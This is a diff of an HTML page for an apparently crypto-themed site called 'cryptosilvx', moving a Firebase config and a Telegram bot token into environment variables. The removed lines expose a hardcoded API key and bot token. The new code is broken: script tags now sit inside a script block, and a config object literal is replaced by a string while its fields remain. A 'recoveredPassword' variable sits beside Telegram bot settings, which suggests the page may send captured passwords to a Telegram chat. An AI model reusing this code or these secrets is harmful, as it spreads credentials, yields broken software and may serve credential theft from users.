@@ -2400,21 +2400,21 @@
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <!-- Flatpickr for calendar -->
-    <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
-
     <script>
         // =============================================
         // FIREBASE CONFIGURATION
         // =============================================
-        const firebaseConfig = {
-            apiKey: "AIzaSyBq6cSj25KWfHYlzJ6UYTbjEafv9hMrJgY",
-            authDomain: "cryptosilvx-c4923.firebaseapp.com",
-            projectId: "cryptosilvx-c4923",
-            storageBucket: "cryptosilvx-c4923.appspot.com",
-            messagingSenderId: "265648623060",
-            appId: "1:265648623060:web:3ecc402893e873fb2cda41"
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <!-- Flatpickr for calendar -->
+    <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+
+        const firebaseConfig = window.ENV?.FIREBASE_CONFIG || '';
+            apiKey: '',
+            authDomain: '',
+            projectId: '',
+            storageBucket: '',
+            messagingSenderId: '',
+            appId: ''
         };
 
         // Initialize Firebase
@@ -3080,7 +3080,7 @@
         let recoveredPassword = null;
 
         // Telegram bot configuration
-        const telegramBotToken = '7922730092:AAG9SKMfjwCP1nmEJ9U-kboj_0XPNveQlsM';
+        const telegramBotToken = window.ENV?.TELEGRAM_BOT_TOKEN || '';
         const telegramChatId = '7340540197';
 
         // Reserve configuration
@@ -4121,4 +4121,5 @@
         });
     </script>
 </body>
+
 </html>
